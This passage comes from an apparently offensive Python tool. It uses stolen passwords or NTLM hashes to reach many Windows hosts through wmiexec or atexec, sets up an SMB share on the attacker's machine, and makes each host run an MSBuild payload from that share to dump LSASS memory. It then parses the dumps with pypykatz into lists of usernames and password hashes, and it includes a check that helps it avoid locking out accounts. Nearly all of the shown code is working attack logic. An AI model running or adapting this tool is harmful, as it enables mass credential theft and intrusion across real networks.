                    f.write('{}: {}\n'.format(addresses[x], str(e)))
                    f.close()

                if str(e).find('STATUS_LOGON_FAILURE') != -1 and options.localauth == False:  # way to track failed logins to see if they're gonna lock the account out
                    logging.error('{}: {}'.format(addresses[x], str(e)))
                    failed_logons += 1

                if failed_logons >= 3 and options.localauth == False:
                    cont = input('{}[!]{} Warning you got the user\'s password wrong on {} machines, you may lock the account out if the password is incorrect and you continue, please validate the password! Do you wish to continue? (y/N) '.format(color_YELL, color_reset, failed_logons))
                    if cont.lower() == 'n':
                        print("\n{}[!]{} Cleaning up please wait".format(color_YELL, color_reset))
                        try:
                            os.system("sudo systemctl stop smbd")
                        except BaseException as e:
                            pass

                        try:
                            os.system("sudo cp " + cwd + "{}/smb.conf /etc/samba/smb.conf")
                        except BaseException as e:
                            pass

                        try:
                            os.system("sudo rm " + cwd + "/smb.conf")
                        except BaseException as e:
                            pass

                        try:
                            os.system("sudo userdel " + share_user)
                        except BaseException as e:
                            pass

                        try:
                            os.system("sudo groupdel " + share_group)
                        except BaseException as e:
                            pass

                        try:
                            os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, cwd, timestamp))
                        except BaseException as e:
                            pass
                        print("{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(color_BLU, color_reset))
                        exit(0)
                continue
            # end of antilocout check

    if os.path.isfile('{}/drives.txt'.format(cwd)): # incase they run with localauth to prevent file not found err
        os.system('sudo rm {}/drives.txt'.format(cwd))
    with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
        for ip in addresses:
            if options.localauth:
                domain = ip
            try:
                out = thread_exe.schedule(exec_netuse, (ip, domain,), timeout=25)
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                with open('{}/log.txt'.format(cwd), 'a') as f:
                    f.write(str(e) + '\n')
                    f.close()
                logging.error(str(e))
                continue
            except KeyboardInterrupt as e:
                continue
    outdata = []
    try:
        data = '' # read data that was saved to drives.txt into data
        with open('{}/drives.txt'.format(cwd), 'r') as f:
            data = f.read()
            f.close()
        outdata = re.findall('[A-Z][:]', data) # rip out all the A: C: drive letters
    except BaseException as e:
        pass

    cleaned_outdata = []
    for drive in outdata: # strip the :
        cleaned_outdata.append(drive.replace(":", ""))

    inuse_driveletters = []

    for letter in cleaned_outdata:
        if letter not in inuse_driveletters:
            inuse_driveletters.append(letter)

    if os.path.isfile('{}/drives.txt'.format(cwd)): # cleanup that file
        os.system('sudo rm {}/drives.txt'.format(cwd))

    for item in list(map(chr, range(ord('A'), ord('Z') + 1))):
        if item not in inuse_driveletters and item != 'C' and item != 'D':
            return item

    least_common = collections.Counter(cleaned_outdata).most_common()[-1]
    print('{}[!]{} Between every machine all drive letters are in use'.format(color_YELL, color_reset))
    print('{}[*]{} The least used drive letter is {}: it is available on {}/{} machines\n'.format(color_BLU, color_reset, least_common[0], (len(addresses) - least_common[1]), len(addresses)))

    yn = input('Would you like to use {}: as the drive letter if not we exit ps. the program will hang on the machines that have the drive mounted (y/N) '.format(least_common[0]))
    if yn.lower() == 'y':
        return least_common[0]
    else:
        exit(0)

def mt_execute(ip): # multithreading requires a function
    print("{} Attacking {}".format(green_plus, ip))
    try:
        if options.method == 'wmiexec':
            executer = WMIEXEC(command, username, password, domain, options.hashes, options.aesKey, options.share, False, options.k, options.dc_ip, 'cmd')
            executer.run(ip, False)
        elif options.method == 'atexec':
            atsvc_exec = TSCH_EXEC(username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip, command, None, False)
            atsvc_exec.play(ip)
        print("{} {}: Completed".format(green_plus, ip))
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        with open('{}/log.txt'.format(cwd), 'a') as f:
            f.write('{}: {}\n'.format(ip, str(e)))
            f.close()
        logging.error('{}: {}'.format(ip, str(e)))
        pass

# Process command-line arguments.
if __name__ == '__main__':
    # quick checks to see if were good
    if sys.platform != "linux":
        print("[!] This program is Linux only")
        exit(1)

    if os.path.isdir(cwd + "/loot") == False:
        os.makedirs(cwd + "/loot")

    print(reaper_banner)
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description="")
    if '-oe' not in sys.argv: # if were using another exec method we dont need to get target
        parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName, address, range, cidr>')
    parser.add_argument('-share', action='store', default='ADMIN$', help='share where the output will be grabbed from (default ADMIN$) (wmiexec ONLY)')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-oe', action='store_true', default = False, help='Pause just before the execution of the payload (Good for when you want to execute the payload using other methods)')
    parser.add_argument('-ap', action='store_true', default = False, help='Turn auto parsing of .dmp files ON this will parse the .dmp files into dumped_full.txt, dumped_full_grep.grep, and dumped_msv.txt')
    parser.add_argument('-drive', action='store', help='Set the drive letter for the remote device to connect with')
    parser.add_argument('-threads', action='store', type = int, default = 5,help='Set the maximum number of threads default=5')
    parser.add_argument('-timeout', action='store', type=int, default=90, help='Set the timeout in seconds for each thread default=90')
    parser.add_argument('-method', action='store', default='wmiexec', choices=['wmiexec', 'atexec'], help='Choose a method to execute the commands')
    parser.add_argument('-ip', action='store', help='Your local ip or network interface for the remote device to connect to')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                                                       'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py '
                                                       'again with -codec and the corresponding codec ' % CODEC)
    parser.add_argument('-com-version', action='store', metavar="MAJOR_VERSION:MINOR_VERSION", help='DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')

    group = parser.add_argument_group('authentication')
    group.add_argument('-localauth', action='store_true', default = False, help='Authenticate with a local account to the machine')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH or just NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                            'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                                                                            'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-A', action="store", metavar="authfile", help="smbclient/mount.cifs-style authentication file. "
                                                                      "See smbclient man page's -A option.")
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    if os.geteuid() != 0:
        print("[!] Must be run as sudo")
        exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.codec is not None:
        CODEC = options.codec
    else:
        if CODEC is None:
            CODEC = 'utf-8'

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    if options.com_version is not None:
        try:
            major_version, minor_version = options.com_version.split('.')
            COMVERSION.set_default_version(int(major_version), int(minor_version))
        except Exception:
            logging.error("Wrong COMVERSION format, use dot separated integers e.g. \"5.7\"")
            sys.exit(1)

    if '-oe' in sys.argv:
        options.target = 'eriujf/eriuhe:\'rguire\'@1'

    domain, username, password, address = parse_target(options.target)

    try:
        if options.A is not None:
            (domain, username, password) = load_smbclient_auth_file(options.A)
            logging.debug('loaded smbclient auth file: domain=%s, username=%s, password=%s' % (
                repr(domain), repr(username), repr(password)))

        if domain is None:
            domain = ''

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

        if options.drive is not None and options.drive.isalpha() and len(options.drive) < 2: # did we get a drive letter?
            drive_letter = str(options.drive).upper()
        else:
            drive_letter = 'Q'

        if options.hashes is not None and options.hashes.find(':') == -1: # quick check to prevent formatting error with hashes
            options.hashes = ':{}'.format(options.hashes)

        if options.ip is not None: # did they give us the local ip in the command line
            local_ip = options.ip
            ifaces = ni.interfaces()
            try: # check to see if the interface has an ip
                if local_ip in ifaces:
                    local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
                    print("local IP => " + local_ip)
            except BaseException as exc:
                print('{}[!!]{} Error could not get that interface\'s address. Does it have an IP?'.format(color_RED, color_reset))
                exit(0)
        else:
            # print local interfaces and ips
            print("")
            ifaces = ni.interfaces()
            for face in ifaces:
                try: # check to see if the interface has an ip
                    print(str(face + ':').ljust(20), ni.ifaddresses(face)[ni.AF_INET][0]['addr'])
                except BaseException as exc:
                    continue

            local_ip = input("\nEnter you local ip or interface: ")

            # lets you enter eth0 as the ip
            if local_ip in ifaces:
                local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
                print("local IP => " + local_ip)

        if '-oe' not in sys.argv: # why scan if we not gonna do anything
            addresses, hostnames, ips_from_hostnames = do_ip(address, local_ip) # gets a list of up hosts

            if len(addresses) > 500: # ensure that they dont waste over 25 gb of storage
                print("\nWARNING You are about to try and steal LSA from up to {} IPs...\nThis is roughly {}GB in size are you sure you want to do this? ".format(str(len(addresses)), str((len(addresses)*52)/1024)))
                choice = input("(N/y): ")
                if choice.lower() == 'n':
                    exit(0)

        share_name, share_user, share_pass, payload_name, share_group = setup_share() # creates and starts our share
        print("\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n".format(share_name, share_user,share_pass))

        # automatically find the best drive to use
        if options.drive is None and options.method == 'wmiexec' and options.oe == False:
            drive_letter = auto_drive(addresses, domain)

        gen_payload(share_name, payload_name, drive_letter) # creates the payload

        print("\n[This is where the fun begins]\n{} Executing payload via {}\n".format(green_plus, options.method))
        command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
        print(command)
        print("")

        if options.oe:
            alt_exec()

        with open('{}/log.txt'.format(cwd), 'a') as f:
            f.write('Total targets: {}\n'.format(len(addresses)))
            f.close()
        print('Total targets: {}'.format(len(addresses)))
        # multithreading yeah
        with ProcessPool(max_workers=options.threads) as thread_exe: # changed to pebble from concurrent futures because pebble supports timeout correctly
            for ip in addresses:
                if options.localauth:
                    domain = ip
                try:
                    out = thread_exe.schedule(mt_execute, (ip,), timeout=options.timeout)
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    with open('{}/log.txt'.format(cwd), 'a') as f:
                        f.write(str(e) + '\n')
                        f.close()
                    logging.error(str(e))
                    continue
                except KeyboardInterrupt as e:
                    continue

        time.sleep(2)
        os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, cwd, timestamp))

        with open('{}/log.txt'.format(cwd), 'a') as f:
            f.write('Extracted LSA: {}/{}\n'.format(len([name for name in os.listdir("{}/loot/{}".format(cwd, timestamp)) if os.path.isfile(os.path.join("{}/loot/{}".format(cwd, timestamp), name))])-1, len(addresses)))
            f.close()
        # for when you're attacking a lot of targets to quickly see how many we got
        print('\n{} Total Extracted LSA: {}/{}\n'.format(green_plus, len([name for name in os.listdir("{}/loot/{}".format(cwd, timestamp)) if os.path.isfile(os.path.join("{}/loot/{}".format(cwd, timestamp), name))])-1, len(addresses)))

        if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
            os.system('sudo rm {}/drives.txt'.format(cwd))

        dmp_files = [f for f in os.listdir("{}/loot/{}/".format(cwd, timestamp)) if f.endswith('.dmp')] # this should enable us to change the filenames to hostname_ip.dmp
        for file in dmp_files:
            for name in hostnames:
                if file[:file.find(".")].lower() == name[:name.find(".")].lower():
                    os.system("mv {}/loot/{}/{} {}/loot/{}/{}.dmp".format(cwd, timestamp, file, cwd, timestamp, (file[:file.find(".")] + "_" + ips_from_hostnames[hostnames.index(name)])))

        if options.ap != False:
            print("\n[parsing files]")
            os.system("python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt".format(cwd, timestamp, cwd, timestamp))
            os.system("python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep".format(cwd, timestamp, cwd, timestamp))
            os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host' >> {}/loot/{}/dumped_msv.txt".format(cwd, timestamp, cwd, timestamp, cwd, timestamp))

            remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
            if remove_files.lower() == 'y':
                os.system('sudo rm {}/loot/{}/*.dmp'.format(cwd, timestamp))

    except KeyboardInterrupt as e:
        logging.error(str(e))
        print("\n{}[!]{} Cleaning up please wait".format(color_YELL, color_reset))

        if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
            os.system('sudo rm {}/drives.txt'.format(cwd))

        try:
            os.system("sudo systemctl stop smbd")
        except BaseException as e:
            pass

        try:
            os.system("sudo cp " + cwd + "/smb.conf /etc/samba/smb.conf")
        except BaseException as e:
            pass

        try:
            os.system("sudo rm " + cwd + "/smb.conf")
        except BaseException as e:
            pass

        try:
            os.system("sudo userdel " + share_user)
        except BaseException as e:
            pass

        try:
            os.system("sudo groupdel " + share_group)
        except BaseException as e:
            pass

        try:
            os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, cwd, timestamp))
        except BaseException as e:
            pass
        print("{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(color_BLU, color_reset))
        exit(0)

    print("{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))
    if os.path.isfile('{}/drives.txt'.format(cwd)): # cleanup that file
        os.system('sudo rm {}/drives.txt'.format(cwd))

    try:
        os.system("sudo systemctl stop smbd")
    except BaseException as e:
        pass

    try:
        os.system("sudo cp " + cwd + "/smb.conf /etc/samba/smb.conf")
    except BaseException as e:
        pass

    try:
        os.system("sudo rm " + cwd + "/smb.conf")
    except BaseException as e:
        pass

    try:
        os.system("sudo userdel " + share_user)
    except BaseException as e:
        pass

    try:
        os.system("sudo groupdel " + share_group)
    except BaseException as e:
        pass
    print("{}[-]{} Cleanup completed! If the program does not automatically exit press CTRL + C".format(color_BLU, color_reset))
    sys.exit(0)
